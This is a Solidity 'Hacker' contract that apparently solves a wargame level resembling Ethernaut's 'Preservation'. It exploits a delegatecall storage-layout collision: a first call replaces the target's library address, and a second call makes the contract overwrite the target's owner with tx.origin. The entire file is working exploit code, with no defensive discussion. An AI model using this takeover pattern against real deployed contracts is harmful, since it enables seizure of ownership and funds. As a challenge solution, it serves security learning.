// SPDX-License-Identifier: MIT
pragma solidity >=0.8.5 <0.9.0;

contract Hacker {
  /**
   * @dev copy storage layout of the target contract.
   * That's the reason why hacker should be at the end of it.
   */
  address public timeZone1Library;
  address public timeZone2Library;
  address public owner;
  uint256 storedTime;

  address public hacker;

  modifier onlyHacker {
    require(msg.sender == hacker, "caller is not the hacker");
    _;
  }

  constructor() {
    hacker = payable(msg.sender);
  }

  /**
   * @dev The target contract will delegate call to here.
   * Modify the target contract's owner.
   */
  function setTime(uint256 _time) public {
    _time;
    owner = tx.origin;
  }

  /**
   * @dev Attack the target contract by following in the designed scenario.
   */
  function attack(address _target) public onlyHacker {
    // 1. Call target's setFirtTime or setSecondTime, in order to modify the address of timeZone1Library
    (bool result, ) = _target.call(abi.encodeWithSignature("setFirstTime(uint256)", address(this)));
    require(result, "Hacker: 1st Attack failed!");
    // 2. The target's timeZone1Library is now pointing our hacker contract. Call target's setFirstTime again to modify its owner.
    (result, ) = _target.call(abi.encodeWithSignature("setFirstTime(uint256)", address(this)));
    require(result, "Hacker: 2nd Attack failed!");
  }
}
